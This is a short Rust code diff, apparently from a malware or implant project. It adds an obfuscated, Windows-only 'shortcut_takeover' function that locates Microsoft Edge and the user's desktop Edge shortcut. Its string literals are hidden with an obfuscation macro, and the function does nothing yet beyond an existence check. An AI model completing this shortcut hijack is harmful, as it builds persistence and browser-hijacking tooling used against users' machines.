@@ -1,17 +1,26 @@
 use std::env;
+use std::path::Path;
 use std::path::PathBuf;
 use winreg::enums::*;
 use winreg::RegKey;
 use goldberg::goldberg_string;
-
 use crate::debug_println;
 
 #[inline]
-pub fn shortcut_takeover(id: &str) -> Result<(), Box<dyn std::error::Error>> {
-    let edgeBinPath = goldberg_string!("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"); 
-    let edgeDirPath = goldberg_string!("C:\\Program Files (x86)\\Microsoft\\Edge\\Application"); 
+pub fn shortcut_takeover(id: &str, hostname: &str) -> Result<(), Box<dyn std::error::Error>> {
+    if env::consts::OS != "windows" {
+        return Ok(());
+    }
 
-    // TODO
+    let desktop_dir_path = format!("C:\\Users\\{}\\Desktop", hostname);
+
+    let edge_bin_path = goldberg_string!("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"); 
+    let edge_dir_path = goldberg_string!("C:\\Program Files (x86)\\Microsoft\\Edge\\Application");
+    let edge_shortcut_path = format!("{}\\Microsoft Edge", desktop_dir_path);
+
+    if !Path::new(&edge_shortcut_path).exists() {
+        return Ok(());
+    }
 
     return Ok(());
 }
